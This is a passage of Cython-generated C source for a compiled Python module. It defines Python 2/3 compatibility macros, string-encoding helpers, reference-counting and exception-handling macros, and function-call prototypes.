  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
